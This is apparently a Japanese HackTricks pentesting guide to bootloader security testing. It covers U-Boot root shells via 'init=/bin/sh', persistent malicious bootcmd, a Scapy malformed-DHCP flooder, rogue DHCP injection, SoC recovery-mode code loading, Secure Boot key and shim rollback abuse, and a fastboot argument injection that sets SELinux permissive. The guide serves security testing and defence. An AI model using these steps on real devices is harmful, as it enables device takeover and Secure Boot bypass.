# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

以下の手順は、デバイスの起動設定を変更し、U-BootやUEFIクラスのloaderなどのbootloaderをテストする際に推奨されます。早期のコード実行を実現し、署名やrollbackの保護を評価し、recoveryやnetwork-bootの経路を悪用することに重点を置きます。

関連項目: bl2_extのpatchingによるMediaTek secure-boot bypass:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Bootの手っ取り早い攻略法と環境の悪用

1. インタープリターshellにアクセスする
   - 起動中に、`bootcmd`が実行される前に既知の中断キー（多くの場合、任意のキー、0、space、またはボード固有の「magic」シーケンス）を押して、U-Boot promptを表示します。<sup>[[1]](#references)</sup>

2. 起動状態と変数を調べる
   - 便利なコマンド:
     - `printenv` (環境をダンプ)
     - `bdinfo` (ボード情報、メモリアドレス)
     - `help bootm; help booti; help bootz` (対応するkernel boot方式)
     - `help ext4load; help fatload; help tftpboot` (利用可能なloader)

3. root shellを取得するためにboot引数を変更する
   - `init=/bin/sh`を追加すると、通常のinitの代わりにkernelがshellを起動します:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. TFTP serverからNetboot
   - ネットワークを設定し、LANからkernel/fitイメージを取得します:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. 環境経由で変更を永続化
   - env storage が書き込み保護されていない場合、制御権を永続化できます:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - フォールバック経路に影響する `bootcount`、`bootlimit`、`altbootcmd`、`boot_targets` などの変数を確認します。値の設定ミスにより、shell への侵入を繰り返し許してしまうことがあります。

6. debug/unsafe features の確認
   - 次の項目を探します。`bootdelay` > 0、`autoboot` の無効化、制限のない `usb start; fatload usb 0:1 ...`、シリアル経由での `loady`/`loads` の実行、信頼できないメディアからの `env import`、署名検証なしでの kernel/ramdisk のロード。

7. U-Boot image/verification のテスト
   - プラットフォームが FIT images による secure/verified boot を謳っている場合は、署名なしの image と改ざんした image の両方を試します。
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` がない場合や、従来の `verify=n` の動作では、任意のペイロードを起動できることがよくあります。
   - 単純な許可／拒否の結果だけで終わらせないでください。最近の FIT 研究では、検証処理そのものが認証前の攻撃対象領域になり得ることが示されました。外部に保存された FIT データ（`data-offset`、`data-position`、`data-size`）、署名済み設定の選択、`loadables`、overlay／`extra-conf` の処理を負のテストで検証してください。
   - 対応するソースツリーがある場合、実機に触れる前に `test/vboot/vboot_test.sh` を使うと、U-Boot sandbox 上で FIT 検証の動作をすばやく再現できます。<sup>[[10]](#references)</sup>

8. Standard Boot（`bootstd`）、`extlinux`、スクリプト bootflow
   - 最近の U-Boot ビルドでは、`bootcmd` は単に Standard Boot を呼び出すラッパーであることがよくあります。そのため、表示される環境が無害に見えても、書き込み可能なメディア、PXE、SPI flash が実際の信頼境界になる可能性があります。
   - `extlinux` bootmeth は `/` および `/boot` 以下の `extlinux/extlinux.conf` を検索します。script bootmeth は最初に `boot.scr.uimg`、次に `boot.scr` を検索します。ネットワークブートでは、スクリプトのファイル名が `boot_script_dhcp` から取得されることがあります。
   - トリアージに役立つコマンド：
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - テストする abuse case: `boot_targets` 内で優先順位が高い、攻撃者が制御する USB/SD メディア、書き込み可能な `/boot/extlinux/extlinux.conf`、`boot.scr` を提供する不正な TFTP、または `script_offset_f` を介した SPI-backed script execution。
   - プラットフォームが FIT verification に依存する場合は、構成レベルで署名されており、イメージごとの署名だけではないことを確認してください。`required-mode=all` は、必須キーのいずれか1つだけを受け入れる設定よりも強力です。

## ネットワークブートの攻撃対象領域（DHCP/PXE）と不正サーバー

9. PXE/DHCP パラメーターの fuzzing
   - U-Boot の従来型 BOOTP/DHCP 処理には、メモリ安全性に関する問題がありました。たとえば、CVE‑2024‑42040 は、細工された DHCP 応答によるメモリ開示について記述しており、U-Boot のメモリからバイト列がネットワーク上に漏れる可能性があります。<sup>[[4]](#references)</sup> DHCP/PXE のコードパスに、過度に長い値や境界値（option 67 の bootfile-name、vendor options、file/servername フィールド）を与えてテストし、ハングや leak が発生しないか確認してください。
   - netboot 中のブートパラメーターに負荷をかける最小限の Scapy スニペット:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - PXE filename フィールドが、OS 側のプロビジョニングスクリプトに連携される際、サニタイズされずに shell/loader の処理に渡されるかどうかも検証します。

10. Rogue DHCP server の command injection テスト
   - Rogue DHCP/PXE サービスをセットアップし、filename フィールドまたは options フィールドに文字を注入して、ブートチェーンの後続ステージで command interpreter に到達できるか試します。Metasploit の DHCP auxiliary、`dnsmasq`、またはカスタム Scapy スクリプトが適しています。まずラボのネットワークを隔離してください。

## 通常のブートを上書きする SoC ROM recovery modes

多くの SoC では、フラッシュイメージが無効でも USB/UART 経由でコードを受け付ける BootROM の「loader」モードが利用できます。secure-boot の fuse が未設定であれば、ブートチェーンのごく早い段階で任意のコードを実行できる可能性があります。

- NXP i.MX（Serial Download Mode）
  - ツール: `uuu` (mfgtools3) または `imx-usb-loader`。
  - 例: `imx-usb-loader u-boot.imx` を実行し、カスタム U-Boot を RAM に送信して実行します。
- Allwinner（FEL）
  - ツール: `sunxi-fel`。
  - 例: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` または `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`。
- Rockchip（MaskROM）
  - ツール: `rkdeveloptool`。
  - 例: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` を実行し、loader を配置してカスタム U-Boot をアップロードします。

デバイスの secure-boot eFuses/OTP が焼き込まれているか確認します。焼き込まれていない場合、BootROM の download mode は多くの場合、最初のステージの payload を SRAM/DRAM から直接実行し、上位レイヤーの検証（U-Boot、kernel、rootfs）を回避します。

## UEFI/PC クラスの bootloader: 簡易チェック

11. ESP の改ざん、rollback、key enrollment のテスト
   - EFI System Partition (ESP) をマウントし、loader コンポーネントを確認します: `EFI/Microsoft/Boot/bootmgfw.efi`、`EFI/BOOT/BOOTX64.efi`、`EFI/ubuntu/shimx64.efi`、`grubx64.efi`、ベンダーのロゴパス。
   - 可能であれば、OS から Secure Boot の状態と key database をダンプします:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - プラットフォームが Setup Mode の場合、認証なしでキー登録を受け付ける場合、またはテスト用／デフォルトの Platform Key（PKfail クラス）が搭載されている場合、ローカル管理者や物理アクセスを持つ攻撃者は独自の KEK/db を登録し、Secure Boot が「有効」に見える状態のまま任意の EFI バイナリを起動できます。<sup>[[3]](#references)</sup>
   - Secure Boot の失効情報（dbx）が最新でない場合は、ダウングレードした署名済みブートコンポーネントや、既知の脆弱性を持つものを使った起動を試してください。プラットフォームが古い shim/bootmanager をまだ信頼している場合、ESP から独自のカーネルや `grub.cfg` を読み込んで永続化できることがよくあります。

12. 古い shim / SBAT / dbx の失効テスト
   - 失効情報が古い場合、古い Microsoft 署名済み shim やベンダー独自のフォークが、BYOVD 形式の bootkit 経路として機能する可能性があります。隔離されたラボで、過去に脆弱性があった shim を ESP に配置し、独自の `grubx64.efi` またはカーネルを chainload できるか試してください。<sup>[[11]](#references)</sup>
   - 簡易トリアージ：
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - shimが失効リストに登録されているにもかかわらず実行される場合、firmware/OSの`dbx`更新が古いか、上流のSBAT保護を継承していないfork版loaderを信頼しています。

13. Boot logoの解析バグ（LogoFAILクラス）
   - 複数のOEM/IBV firmwareで、boot logoを処理するDXEの画像解析の脆弱性が確認されています。攻撃者がベンダー固有のパス（例：`\EFI\<vendor>\logo\*.bmp`）に細工した画像をESP上に配置して再起動できる場合、Secure Bootが有効でも、boot初期段階でコード実行できる可能性があります。プラットフォームがユーザー指定のlogoを受け入れるか、またOSからこれらのパスに書き込み可能かをテストしてください。<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16)の信頼性の欠陥

QualcommのABLが**Generic Bootloader Library (GBL)**を読み込むAndroid 16端末では、ABLが`efisp`パーティションから読み込むUEFI appを**認証する**か確認してください。ABLがUEFI appの**存在**だけを確認し、署名を検証しない場合、`efisp`へのwrite primitiveによって、boot時に**OS起動前の未署名コード実行**が可能になります。<sup>[[6]](#references)[[7]](#references)</sup>

実践的な確認方法と悪用経路：

- **efisp write primitive**：`efisp`にカスタムUEFI appを書き込む手段（root/特権サービス、OEM appのバグ、recovery/fastboot経路）が必要です。これがなければ、GBLの読み込みの欠陥に直接アクセスすることはできません。<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection**（ABLのバグ）：一部のbuildでは、`fastboot oem set-gpu-preemption`に追加のtokenを指定すると、kernel cmdlineに追加されることがあります。これを利用してSELinuxをpermissiveにし、保護されたパーティションへの書き込みを可能にできます：
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  デバイスにパッチが適用されている場合、このコマンドは追加の引数を拒否するはずです。<sup>[[5]](#references)[[6]](#references)</sup>
- **永続フラグによる bootloader のアンロック**: boot-stage payload は永続的なアンロックフラグ（例: `is_unlocked=1`、`is_unlocked_critical=1`）を書き換え、OEM サーバーや承認による制限を回避して `fastboot oem unlock` を再現できます。これは次回の再起動後も維持される状態変更です。<sup>[[6]](#references)</sup>

防御・トリアージに関する注意事項:

- ABL が `efisp` の GBL/UEFI payload に対して署名検証を行うか確認してください。検証を行わない場合、`efisp` は高リスクの永続化領域として扱ってください。
- ABL fastboot OEM ハンドラーにパッチが適用され、**引数の数を検証**して追加トークンを拒否するようになっているか確認してください。<sup>[[8]](#references)[[9]](#references)</sup>

## ハードウェアに関する注意

初期ブート時に SPI/NAND flash を操作する際（読み取りを回避するためにピンを接地するなど）は注意し、必ず flash のデータシートを確認してください。タイミングを誤って短絡させると、デバイスやプログラマーが破損する可能性があります。

## 注意事項とその他のヒント

- `env export -t ${loadaddr}` と `env import -t ${loadaddr}` を試し、環境変数の blob を RAM とストレージ間で移動してください。一部のプラットフォームでは、認証なしでリムーバブルメディアから env をインポートできます。
- `extlinux.conf` 経由で起動する Linux ベースのシステムで永続化するには、署名チェックが強制されていない場合、ブートパーティション上の `APPEND` 行を変更して（`init=/bin/sh` または `rd.break` を注入して）済むことがよくあります。
- ターゲットがデュアルスロット / A/B アップデートを使用している場合は、[firmware analysis overview](README.md) の anti-rollback および slot-desync techniques を確認し、bootloader 自体の外部にある、updater 限定の信頼ギャップを見落とさないようにしてください。
- userland が `fw_printenv/fw_setenv` を提供している場合は、`/etc/fw_env.config` が実際の env ストレージと一致しているか確認してください。オフセットの設定ミスにより、誤った MTD 領域を読み書きする可能性があります。

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAIL の発見: システム起動時の画像解析がもたらす危険性](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: 信頼されていないプラットフォームキーが UEFI エコシステムの Secure Boot を脅かす](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 の詳細](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [先手を打つ: サニタイズされていない2つの文字列を使った Xiaomi のアンロック](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit により、攻撃者が bootloader をアンロック可能に](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) のアーキテクチャ](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: 信頼されていない入力が kernel cmdline に伝播する問題を修正](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: set-hw-fence-value コマンドのチェックを追加](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [起動不能: U-Boot の FIT 署名検証を突破する](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [脆弱性ノート VU#616257 - Microsoft 署名済み UEFI shim bootloader に Secure Boot 回避の脆弱性](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
